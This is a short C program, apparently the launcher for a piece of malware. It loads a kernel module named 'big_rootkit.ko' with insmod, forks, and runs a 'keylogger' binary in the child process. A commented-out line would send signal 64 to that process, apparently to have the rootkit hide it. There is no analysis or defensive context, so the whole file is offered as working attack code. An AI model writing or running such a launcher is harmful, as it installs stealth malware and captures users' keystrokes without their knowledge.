#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

int main(){
  char command[100];
  int pid;

  system("insmod rootkit/big_rootkit.ko");

  pid = fork();
  if(pid == 0) {
    char *argv[] = {"keylogger", NULL};
    char *envp[] = {NULL};
    execve(argv[0], argv, envp);
  }
  else {
    // sprintf(command, "kill -64 %i", pid);
    printf("pid is %i", pid);
    // system(command);
  }
  return 0;
}
